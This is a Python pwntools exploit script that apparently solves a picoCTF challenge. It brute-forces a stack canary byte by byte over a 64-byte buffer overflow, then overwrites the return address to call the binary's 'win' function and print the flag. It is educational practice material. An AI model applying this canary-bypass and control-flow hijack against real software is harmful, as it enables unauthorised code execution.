#!/usr/bin/env python3

from pwn import *
import sys

exe = ELF("./vuln")

context.binary = exe
context.log_level = 'critical'


def conn():
    if args.LOCAL:
        r = process([exe.path])
        # r = gdb.debug([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("saturn.picoctf.net", 63821)

    return r


def main():

    # Brute-force the canary character by character
    canary = b''
    for bytes_guessed in range(4):
        assert(len(canary) == bytes_guessed) # Assertion to ease debugging
        for canary_byte_guess_int in range(2**8):

            r = conn()

            canary_byte_guess_byte = chr(canary_byte_guess_int).encode()
            guess = b''.join([
                b'A'*64,
                canary, 
                canary_byte_guess_byte
            ])

            r.sendlineafter(b'Buffer?\n> ', str(len(guess)).encode())
            r.sendlineafter(b'Input> ', guess)

            output = r.readline()
            if b'Where\'s the Flag?' in output: 
                canary += canary_byte_guess_byte
                print(f"\n{canary=}")
                break

            # Print progress
            sys.stdout.write(f'\rProgress: {len(canary)=}, {hex(canary_byte_guess_int)=}/0xff')
            sys.stdout.flush()
            r.close()

    # Deliver payload and win
    r = conn()
    payload = b''.join([
        b'A'*64,
        canary,
        b'A'*16,
        p32(exe.symbols.win)
    ])

    r.sendlineafter(b'Buffer?\n> ', str(len(payload)).encode())
    r.sendlineafter(b'Input> ', payload)

    # Consume output line
    r.recvline()

    # Print flag
    print(r.recvuntil(b'}'))


if __name__ == "__main__":
    main()
